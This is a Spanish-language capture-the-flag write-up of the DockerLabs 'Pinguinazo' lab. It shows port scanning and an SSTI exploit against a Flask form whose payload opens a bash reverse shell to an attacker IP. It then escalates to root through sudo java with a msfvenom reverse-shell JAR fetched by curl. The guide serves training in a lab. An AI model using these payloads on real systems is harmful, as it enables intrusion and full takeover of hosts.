# Laboratorio Pinguinazo

## Descripción
Writeup del laboratorio **Pinguinazo** de DockerLabs - Dificultad: Easy

## Reconocimiento

### Inicialización del laboratorio
Inicializamos el laboratorio Pinguinazo con el comando:
```bash
./auto_deploy.sh pinguinazo.tar
```

### Escaneo de puertos
Realizamos un escaneo completo de puertos con nmap:

```bash
nmap 172.17.0.2 -sV -A -p-
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-07 16:18 EDT
Nmap scan report for 172.17.0.2
Host is up (0.000034s latency).
Not shown: 65534 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
5000/tcp open  http    Werkzeug httpd 3.0.1 (Python 3.12.3)
|_http-title: Pingu Flask Web
|_http-server-header: Werkzeug/3.0.1 Python/3.12.3
MAC Address: 02:42:AC:11:00:02 (Unknown)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop

TRACEROUTE
HOP RTT     ADDRESS
1   0.03 ms 172.17.0.2

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.97 seconds
```

### Resultados del escaneo
Vemos que el puerto **HTTP (5000)** está abierto.

## Explotación Web

### Reconocimiento web inicial
Navegamos a `http://172.17.0.2:5000` y veremos un apartado de inicio de sesión común y corriente.

### Enumeración de directorios
Aplicaremos técnicas de fuzzing en el sitio web para obtener los siguientes resultados:

```bash
gobuster dir -t 10 -u "http://172.17.0.2:5000" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,htm,xml,txt
```

### Enumeración de directorios
Aplicaremos técnicas de fuzzing en el sitio web para obtener los siguientes resultados:

```bash
gobuster dir -t 10 -u "http://172.17.0.2:5000" -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,htm,xml,txt
```

**Nota importante:** Tenemos que tener en cuenta que si hacemos un fuzzing muy pesado podemos llegar a tirar la página por múltiples peticiones.

```
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2:5000
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,php,html,htm,xml
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/console              (Status: 200) [Size: 1563]
Progress: 24732 / 1323354 (1.87%)^C
```

## Explotación SSTI

### Descubrimiento de consola Flask
Al entrar a `http://172.17.0.2:5000/console` encontramos que hay una consola protegida con PIN que puede otorgarnos RCE. Como el fuzzing no nos regresa tanto, entonces iremos atrás al formulario para probar los campos.

### Prueba de SSTI
Logramos ver que el campo nombre parece retornarnos lo mismo que escribimos, así que probaremos si podemos hacer ataques SSTI. Para probarlo realizaremos `{{7+7}}` y si regresa el resultado significa que podemos ejecutar comandos usando plantillas y ataques de inyección.

Al intentarlo nos regresa un **"Hello 14!"** lo cual significa que efectivamente podemos ejecutar comandos.

### Payload de reverse shell
Utilizaremos el siguiente payload para obtener una reverse shell:

```python
{{ request.application.__globals__.__builtins__.__import__('os').popen('bash -c "/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1"').read() }}
```

**Fuente:** Este payload puede ser encontrado en el repositorio [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) o en el libro [HackTricks](https://book.hacktricks.xyz/) en la sección de SSTI.

## Escalada de Privilegios

### Enumeración inicial
Al estar en la consola vamos a identificar nuestros privilegios para proceder a elevar privilegios:

```bash
sudo -l
```

Y nos sale:

```
Matching Defaults entries for pinguinazo on 2b4523447622:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User pinguinazo may run the following commands on 2b4523447622:
    (ALL) NOPASSWD: /usr/bin/java
```

### Análisis de privilegios
Podemos ver que nuestro usuario puede ejecutar `sudo` junto al binario de `java` sin necesidad de contraseña, el cual vamos a tener que investigar para usar esto para comprometer el sistema.

En [GTFOBins](https://gtfobins.github.io/) no encontramos información relevante, así que procedemos con una aproximación diferente.

### Explotación con Java JAR malicioso
Si podemos ejecutar java como root, podemos ejecutar una reverse shell con extensión `.jar` que nos otorgará una shell como el usuario root.

#### Creación del payload
Usando la herramienta `msfvenom` creamos un `shell.jar` el cual nos permitirá hacer lo mencionado anteriormente:

```bash
msfvenom -p java/shell_reverse_tcp LHOST=172.17.0.1 LPORT=5555 -f jar -o shell.jar
```

#### Transferencia del archivo
Al haber creado el `shell.jar` levantaremos un servidor web en el puerto 8000 en nuestra máquina atacante:

```bash
python3 -m http.server
```

Y en la máquina víctima solicitaremos el archivo:

```bash
curl -O http://172.17.0.1:8000/shell.jar
```

#### Ejecución del exploit
Ahora escucharemos en nuestra máquina atacante el puerto 5555 listos para recibir la reverse shell:

```bash
nc -lvnp 5555
```

Y en la máquina víctima ejecutaremos el script:

```bash
sudo /usr/bin/java -jar shell.jar
```

Recibiremos algo como:
```
connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 47256
```

### Mejora del TTY
Ahora haremos la mejora del TTY:

```bash
script /dev/null -c bash
# Ctrl + Z (para suspender la terminal)
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash
reset
```

Y por último verificamos quiénes somos:

```bash
whoami
# root
```

## Conclusión

**Máquina completada exitosamente**

### Resumen de la explotación:
1. **Reconocimiento:** Escaneo de puertos con nmap
2. **Enumeración web:** Fuzzing con gobuster para descubrir `/console`
3. **SSTI:** Identificación y explotación de Server-Side Template Injection
4. **Reverse shell:** Obtención de acceso inicial mediante payload SSTI
5. **Enumeración de privilegios:** Identificación de sudo con `/usr/bin/java`
6. **Escalada:** Creación y ejecución de JAR malicioso con msfvenom
7. **Root:** Obtención de privilegios de root mediante Java

### Vulnerabilidades identificadas:
- Server-Side Template Injection (SSTI) en aplicación Flask
- Consola de debug Flask expuesta
- Configuración insegura de sudo para ejecutar Java
- Falta de validación de entrada en formularios web

### Técnicas utilizadas:
- **SSTI (Server-Side Template Injection)**
- **Reverse Shell mediante plantillas Jinja2**
- **Escalada de privilegios con Java JAR malicioso**
- **Msfvenom para generación de payloads**

---

**Fecha:** 07 de Septiembre de 2025  
**Dificultad:** Easy  
**Plataforma:** DockerLabs


